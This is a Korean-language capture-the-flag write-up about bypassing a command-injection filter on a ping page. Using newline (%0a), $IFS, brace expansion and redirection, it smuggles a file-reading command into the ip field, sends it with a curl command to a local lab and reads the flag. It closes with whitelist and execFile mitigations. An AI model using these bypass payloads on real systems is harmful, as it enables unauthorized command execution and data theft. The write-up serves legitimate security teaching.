+++
title = "VulnABLE CTF [LUXORA]: Command Injection 🥈 Silver (Filter Bypass)"
description = "LUXORA 플랫폼의 Command Injection Silver 난이도 공백 및 특수기호 우회 기법 분석"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Command Injection", "Silver", "Bypass"]
+++

# VulnABLE CTF [LUXORA]: Command Injection 🥈 Silver

Bronze 단계에서 명령어 구분자(`;`, `&&`)를 사용해 너무 쉽게 서버를 장악하자, 관리자가 `/cmdi/silver` 라우트에 필터링을 걸었습니다.

이번 시나리오에서는 공백 문자(Space)와 널리 쓰이는 명령어 구분자들이 막힌 환경에서, 리눅스 쉘(Shell)의 고유한 특성(내장 변수와 치환)을 활용하여 필터를 우회(Bypass)하는 기법을 배우겠습니다.

---

## 🕒 1. 타겟 탐색 및 필터링 확인 (Reconnaissance)

`/cmdi/silver` 역시 Ping 테스트 페이지입니다. Bronze 페이로드(`8.8.8.8; id`)를 다시 시도해봅니다.

**[응답 결과]**
```text
[Blocked] Invalid characters detected! Spaces and semicolons are not allowed.
```

**[해커의 사고 과정]**
* 에러 메시지를 보니 `세미콜론(;)`과 `공백(Space)`이 명시적으로 필터링 되고 있구나.
* 추가 테스트 결과 `&&`, `|` 파이프 기호 등 일반적인 구분자도 모두 `[Blocked]` 메시지를 반환한다.
* 하지만 리눅스 bash 쉘에는 문자를 대체할 수 있는 수많은 꼼수가 존재한다. 이걸 써보자!

---

## 🕒 2. 필터링 우회 전략 설계 (Bypass Strategies)

### Strategy 1: 명령어 구분자 우회 (Command Separator)
`;`, `&&`, `|` 가 막혔다면 **개행 문자(New Line, `\n`)**를 사용할 수 있습니다. 리눅스에서 엔터 키를 치는 것과 같은 효과를 주어 명령어를 나눕니다.
* URL 인코딩 시: `%0a`

### Strategy 2: 공백 우회 (Space Evasion)
공백(Space)을 쓸 수 없다면 어떻게 `cat flag.txt`를 실행할까요? 리눅스 bash 환경에서 공백을 대체할 수 있는 내장 변수(Environment Variables)와 쉘 문법을 사용합니다.

1. **`$IFS` (Internal Field Separator)**: 기본값이 공백, 탭, 줄바꿈인 쉘 환경 변수입니다. `cat$IFSflag.txt`라고 쓰면 쉘이 이를 알아서 `cat flag.txt`로 해석합니다.
2. **Brace Expansion (중괄호 확장)**: `{cat,flag.txt}` 라고 쓰면 bash가 이를 `cat flag.txt`로 펼쳐서 실행해줍니다.
3. **입력 재지정(Redirection)**: `cat<flag.txt` (명령어와 파일 사이의 공백 대신 꺾쇠 사용)

---

## 🕒 3. 공격 수행 및 PoC (Exploitation)

우회 기법을 종합하여 새로운 페이로드를 만듭니다.

**[우회 페이로드 구조]**
1. 정상 IP 입력: `8.8.8.8`
2. 구분자 개행 삽입: `%0a`
3. 공백 없는 명령어: `cat$IFS/flag_silver.txt` (또는 `cat</flag_silver.txt`)

완성된 URL 인코딩 페이로드:
`ip=8.8.8.8%0acat$IFS/flag_silver.txt`

### 🚀 페이로드 전송
Burp Suite나 curl을 이용해 페이로드를 전송합니다.

```bash
$ curl -X POST http://localhost:3000/cmdi/silver -d "ip=8.8.8.8%0acat\$IFS/flag_silver.txt"
```

### 🔍 공격 결과
필터는 `%0a`와 `$IFS`를 위험한 문자로 인지하지 못하고 통과시켰으며, 백엔드의 `bash` 쉘은 이 특수 기호들을 충실하게 해석하여 파일을 읽어냈습니다.

```text
PING 8.8.8.8...
(핑 결과 생략)
FLAG{CMDI_🥈_IFS_BYPASS_A1B2C3}
```

---

## 🕒 4. 플래그 획득 및 원리 요약 🚩

**플래그 획득:** `FLAG{CMDI_🥈_IFS_BYPASS_A1B2C3}`

### 📝 왜 이런 공격이 성공했는가?
개발자가 쉘의 깊은 동작 원리를 이해하지 못한 채, 겉으로 보이는 특수문자 몇 개(블랙리스트)만 치워버렸기 때문입니다. bash 쉘은 극도로 유연하게 설계되어 있어, 개발자가 미처 생각지 못한 수십 가지의 치환 및 변수 확장 기능을 가지고 있습니다. 블랙리스트 방식은 쉘의 유연성 앞에서 무용지물이 됩니다.

### 🛡️ 방어 대책 (Mitigation)
1. **절대적 화이트리스트**: 입력값이 IP 주소라면 `[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}` 에 정확히 매칭되는지 `^`와 `$` 앵커를 써서 처음부터 끝까지 엄격하게 확인해야 합니다.
2. **쉘 인터프리터 배제**: Node.js의 경우 `exec()` 대신 `execFile()`을 사용하면, 리눅스의 bash 쉘을 아예 거치지 않고 운영체제 API를 직접 호출하므로 `$IFS`나 `%0a` 같은 꼼수 문법이 아예 동작하지 않게 됩니다.

다음 카테고리인 **Gold 🥇 난이도 (Blind Command Injection)**에서는 화면에 결과가 나오지 않을 때 시스템을 어떻게 장악하는지 살펴보겠습니다!